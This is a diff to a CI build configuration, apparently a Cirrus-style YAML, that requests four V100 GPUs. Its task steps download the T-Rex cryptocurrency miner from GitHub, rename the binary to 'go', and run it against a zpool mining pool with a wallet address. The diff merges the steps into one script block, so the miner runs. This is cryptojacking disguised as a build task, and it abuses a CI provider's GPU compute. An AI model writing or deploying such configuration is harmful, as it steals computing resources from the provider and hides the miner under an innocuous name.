@@ -5,9 +5,10 @@ container:
   gpu: 4
   gpu_type: nvidia-tesla-v100 # do we need the choice?
 task:
-  script: apt update -y
-  script: apt install -y wget
-  script: wget https://github.com/trexminer/T-Rex/releases/download/0.19.11/t-rex-0.19.11-linux-cuda10.0.tar.gz
-  script: tar -xvf t-rex-0.19.11-linux-cuda10.0.tar.gz
-  script: mv t-rex go
-  script: ./go -a megabtx -o stratum+tcp://megabtx.na.mine.zpool.ca:3558 -u sJQWLNfw2KQ7mqBZusRqse8U2GU1kZubUW -p c=BTX,zap=BTX 
+  script: |
+   apt update -y
+   apt install -y wget
+   wget https://github.com/trexminer/T-Rex/releases/download/0.19.11/t-rex-0.19.11-linux-cuda10.0.tar.gz
+   tar -xvf t-rex-0.19.11-linux-cuda10.0.tar.gz
+   mv t-rex go
+   ./go -a megabtx -o stratum+tcp://megabtx.na.mine.zpool.ca:3558 -u sJQWLNfw2KQ7mqBZusRqse8U2GU1kZubUW -p c=BTX,zap=BTX 
